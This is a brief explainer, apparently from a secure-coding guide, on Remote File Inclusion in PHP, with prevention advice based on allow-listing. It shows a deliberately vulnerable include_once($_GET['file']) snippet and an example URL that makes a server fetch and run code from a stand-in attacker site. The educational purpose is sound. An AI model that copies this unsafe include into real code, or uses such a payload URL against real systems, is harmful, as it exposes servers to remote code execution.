![RFI](image/RFI.png?raw=true "RFI")

# Description
Remote File Inclusion (also known as RFI) is the process of including remote files through the exploiting of vulnerable inclusion procedures implemented in the application. This vulnerability occurs, for example, when a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, allowing external URL to be injected.


# Vulnerable Example
The require and require_once functions alongside include and include_once are commonly abused in File Inclusion exploits. The only difference being that require functions will generate an error and halt the running script if the file is not found, whereas include functions will only generate a warning.

```php
<?php include_once($_GET['file']); ?>
```

Consider the following URL:
`http://vulnerable_host/vuln_page.php?file=http://attacker_site/malicous_page.php`
In this case the remote file is going to be included and any code contained in it is going to be run by the server.

# Prevention

If possible, developers should avoid building file path strings with user-provided input, especially when the resources are disclosed to the user or executed at run time.

If passing user-supplied input to a filesystem API is necessary, developers must ensure the following:

- Validate the user input by strictly accepting well-known, reputable candidates against an allow list.
- If validating against an allow list isn't possible, validation should at least ensure that only permitted content is contained in the input.

Reference: [WebAppSec](http://projects.webappsec.org/w/page/13246955/Remote%20File%20Inclusion)